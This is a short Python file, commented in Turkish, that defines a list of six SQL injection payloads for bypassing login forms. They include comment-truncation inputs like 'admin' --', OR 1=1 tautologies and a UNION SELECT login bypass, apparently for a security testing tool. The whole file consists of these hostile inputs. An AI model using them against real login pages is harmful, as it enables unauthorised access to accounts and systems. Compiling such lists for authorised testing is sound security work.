# -*- coding: utf-8 -*-
"""SQL Injection ile Login Bypass Payload Tanımları"""

LOGIN_BYPASS_PAYLOADS = [
    {
        "username": "admin' --",
        "password": "anything",
        "description": "Admin yorum satırı bypass"
    },
    {
        "username": "admin' #",
        "password": "anything",
        "description": "Admin hash bypass"
    },
    {
        "username": "' OR '1'='1' --",
        "password": "' OR '1'='1' --",
        "description": "Her iki alanda OR bypass"
    },
    {
        "username": "' OR 1=1 --",
        "password": "anything",
        "description": "OR 1=1 bypass"
    },
    {
        "username": "admin'/*",
        "password": "*/--",
        "description": "Çok satırlı yorum bypass"
    },
    {
        "username": "' UNION SELECT 'admin','password' --",
        "password": "anything",
        "description": "UNION tabanlı login bypass"
    },
]
